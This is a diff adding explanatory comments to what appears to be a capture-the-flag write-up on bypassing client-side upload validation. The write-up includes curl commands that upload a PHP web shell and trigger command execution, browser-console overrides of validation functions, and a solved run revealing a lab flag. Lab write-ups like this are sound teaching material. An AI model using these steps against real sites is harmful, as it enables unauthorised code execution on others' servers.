@@ -27,6 +27,7 @@ curl -sk -X POST "http://TARGET/upload.php" -F "uploadFile=@shell.php"
 # Trigger
 curl -sk "http://TARGET/profile_images/shell.php?cmd=id"
 ```
+> Sends the upload request directly to the server endpoint, skipping the browser entirely. JavaScript validation never runs when you use curl instead of the web form.
 
 **This is the canonical bypass.** Client-side validation never runs because we never load the page that contains it.
 
@@ -54,6 +55,7 @@ When you want to upload through the actual UI (e.g., to test the flow end-to-end
 checkFile = function() { return true; }
 validate = function() { return true; }
 ```
+> Overrides the JavaScript validation functions in the browser console so they always return `true`. The replacement lasts until the page is refreshed.
 
 Then upload normally. The original function is replaced for the rest of the session.
 
@@ -106,6 +108,7 @@ curl -sk -X POST "http://154.57.164.74:30914/upload.php" \
 curl -sk "http://154.57.164.74:30914/profile_images/shell.php?cmd=cat+/flag.txt"
 # → HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}
 ```
+> Bypasses the client-side `validate()` check entirely by posting directly with curl. The upload path `/profile_images/` was visible in the default avatar `src` attribute.
 
 **Flag:** `HTB{cl13n7_51d3_v4l1d4710n_w0n7_570p_m3}`
 
